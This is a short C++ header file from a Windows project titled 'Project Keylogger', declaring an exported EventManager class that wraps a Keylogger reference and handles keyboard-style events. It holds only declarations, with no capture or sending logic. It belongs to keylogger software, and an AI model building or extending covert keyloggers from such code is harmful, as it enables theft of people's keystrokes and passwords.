/**
 *					Project Keylogger
 */


#ifndef				_EVENTMANAGER_H
#define				_EVENTMANAGER_H

#include			<Windows.h>

#include			"Keylogger.h"

class __declspec(dllexport) 			EventManager {
public: 
    EventManager(const Keylogger&);
	~EventManager();
    void handleEvent(const LPARAM, const WPARAM);
private: 
    const Keylogger& _keylogger;
};

#endif //_EVENTMANAGER_H